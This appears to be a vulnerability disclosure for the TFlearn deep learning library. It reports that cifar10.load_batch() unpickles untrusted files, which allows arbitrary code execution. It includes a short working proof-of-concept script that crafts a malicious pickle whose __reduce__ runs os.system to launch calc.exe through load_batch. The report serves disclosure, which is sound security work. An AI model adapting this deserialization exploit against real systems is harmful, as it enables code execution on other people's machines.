## :writing_hand: Description

`TFlearn` is a modular and transparent deep learning library built on top of Tensorflow. It was designed to provide a higher-level API to TensorFlow in order to facilitate and speed-up experimentations, while remaining fully transparent and compatible with it. This package is vulnerable to `Arbitrary Code Execution`.

## :bug: Vulnerability

`load_batch()` function is used to load CIFAR 10 dataset for training. Lack of restriction in input allowes attacker-crafted file to get unpickled which causes code execution.

## :male_detective: Proof of Concept

#### Installation
```bash
pip install tensorflow
pip install tflearn
```

#### Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
from tflearn.datasets import cifar10

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('payload', 'wb') as f:
    f.write(payload)

cifar10.load_batch('payload')
```
